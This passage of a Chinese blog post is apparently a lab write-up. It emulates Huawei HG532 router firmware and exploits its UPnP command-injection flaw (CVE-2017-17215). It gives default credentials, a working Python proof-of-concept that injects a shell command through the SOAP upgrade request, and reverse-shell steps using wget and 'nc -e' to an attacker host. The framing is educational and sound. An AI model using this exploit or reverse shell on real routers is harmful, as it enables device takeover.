+<p><img src="/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217132428716.png" alt style="zoom:25%;"></p>
+<p>默认的账号密码是：<code>admin</code>，<code>@Hua1234</code></p>
+<p>用 IDA 打开 /bin/upnp 文件，这里使用了下面两个版本都有问题</p>
+<p><img src="/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217145033664.png" alt style="zoom:50%;"></p>
+<p>这里没办法反编译</p>
+<p><img src="/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217145324707.png" alt style="zoom: 25%;"></p>
+<p>后来搞了半天，最后换成 <code>IDA 9</code> 成功反编译</p>
+<p>通过搜索 system
+等命令执行函数的交叉引用，查看存在的命令注入点。由于大部分命令执行函数的参数是硬编码过的，所以找到这个漏洞点并不困难，简单的搜索之后，就可以看到一个
+snprintf 函数在传递参数的过程中，对参数没有做任何校验，然后 snprintf
+读入的格式化字符串参数的地址被传递到了 system 函数中，system 调用 upg
+来进行固件更新</p>
+<p><img src="/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217152812167.png"></p>
+<p>编写 <code>poc.py</code>，功能是注入命令
+<code>/bin/busybox mkdir shell</code> 创建一个 shell。使用 poc
+进行命令注入，在第九行代码处注入代码，这里就是创建一个名为
+<code>11ctg11</code> 的文件夹。</p>
+<p><strong>开始使用https一直返回500，这里需要使用http</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line">headers = {</span><br><span class="line">    <span class="string">"Authorization"</span>: <span class="string">"Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669"</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">data = <span class="string">'''&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="string"> &lt;s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&gt;</span></span><br><span class="line"><span class="string">  &lt;s:Body&gt;&lt;u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1"&gt;</span></span><br><span class="line"><span class="string">   &lt;NewStatusURL&gt;;mkdir /bin/11ctg11;&lt;/NewStatusURL&gt;</span></span><br><span class="line"><span class="string">   &lt;NewDownloadURL&gt;HUAWEIUPNP&lt;/NewDownloadURL&gt;</span></span><br><span class="line"><span class="string">  &lt;/u:Upgrade&gt;</span></span><br><span class="line"><span class="string"> &lt;/s:Body&gt;</span></span><br><span class="line"><span class="string">&lt;/s:Envelope&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">res = requests.post(<span class="string">'http://192.168.50.53:37215/ctrlt/DeviceUpgrade_1'</span>,headers=headers,data=data)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
+<p>ls 查看执行结果</p>
+<p><img src="/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217160536754.png" alt style="zoom:50%;"></p>
+<p>远程命令执行漏洞，没有对代码中可执行的特殊函数入口做过滤，导致客户端可以提交恶意构造的语句提交，让服务器端执行。例如
+web 服务器中的system、eval、exec 等函数， 在上面的 CVE-2017-17215
+也算是远程命令执行漏洞的一种。通过本次实验，加强对路由器命令注入漏洞的利用的理解，并且通过对
+binwalk 等工具
+的使用，理解了实验中各个主体之间的关系，基本掌握不同指令架构下的程序运行方法。</p>
+<h4 id="反弹shell">反弹shell</h4>
+<p>这里由于固件上 busybox 版本问题无法直接nc，我们通过 wget
+传输一个新版本 busybox，随后 nc 反弹 shell.</p>
+<p>这里主机ip为 <code>192.168.50.51</code>，固件设备ip为
+<code>192.168.50.53</code></p>
+<p>首先我们在主机 ip 启动http服务</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8080</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217195825222.png"></p>
+<p>在固件设备上运行
+(这里笔者自己创建了一个ctg的文件夹，在ctg目录下运行指令，实际上也可以直接修改
+<code>poc.py</code>)</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -g -l busybox-mips -r /busybox-mips -P 8080 192.168.50.51</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217201033208.png"></p>
+<p>同时主机端可以看到回显</p>
+<p><img src="/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217201401038.png"></p>
+<p>主机监听 8080 端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 8080</span><br></pre></td></tr></table></figure>
+<p>执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./busybox-mips nc -e 192.168.50.51 8080</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/12/18/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HG532%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20241217202431328.png"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2024/12/17/Crypto/%E6%95%B4%E6%95%B0%E5%88%86%E8%A7%A3/The%20Multiple%20Polynomial%20Quadratic%20Sieve/The%20Multiple%20Polynomial%20Quadratic%20Sieve/" rel="next" title="The Multiple Polynomial Quadratic Sieve">
+                <i class="fa fa-chevron-left"></i> The Multiple Polynomial Quadratic Sieve
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2024/12/19/%E6%AF%94%E8%B5%9Bwp/%E9%95%BF%E5%9F%8E%E6%9D%AF%20&%20%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9B%202025/%E9%95%BF%E5%9F%8E%E6%9D%AF%20&%20%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9B%202025/" rel="prev" title="长城杯 & 信安国赛初赛 2025">
+                长城杯 & 信安国赛初赛 2025 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84"><span class="nav-number">1.</span> <span class="nav-text">实验目的</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E5%86%85%E5%AE%B9%E4%B8%8E%E8%A6%81%E6%B1%82"><span class="nav-number">2.</span> <span class="nav-text">实验内容与要求</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E5%8E%9F%E7%90%86%E4%B8%8E%E6%96%B9%E6%B3%95"><span class="nav-number">3.</span> <span class="nav-text">实验原理与方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E5%8F%96%E5%9B%BA%E4%BB%B6"><span class="nav-number">3.1.</span> <span class="nav-text">提取固件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BDqemu%E8%99%9A%E6%8B%9F%E6%9C%BA"><span class="nav-number">3.2.</span> <span class="nav-text">下载qemu虚拟机</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD%E9%95%9C%E5%83%8F"><span class="nav-number">3.3.</span> <span class="nav-text">下载镜像</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE%E7%BD%91%E7%BB%9C%E5%88%9B%E5%BB%BA%E7%BD%91%E6%A1%A5"><span class="nav-number">3.4.</span> <span class="nav-text">配置网络，创建网桥</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA-tap-%E6%8E%A5%E5%8F%A3%E6%B7%BB%E5%8A%A0%E5%88%B0%E7%BD%91%E6%A1%A5"><span class="nav-number">3.5.</span> <span class="nav-text">创建 tap 接口，添加到网桥</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#qemu-%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE"><span class="nav-number">3.6.</span> <span class="nav-text">qemu 虚拟机配置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%90%AD%E5%BB%BA-hg532e-%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83"><span class="nav-number">3.7.</span> <span class="nav-text">搭建 HG532e 漏洞环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">3.8.</span> <span class="nav-text">反弹shell</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cot287</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true}});</script></body>
+</html>
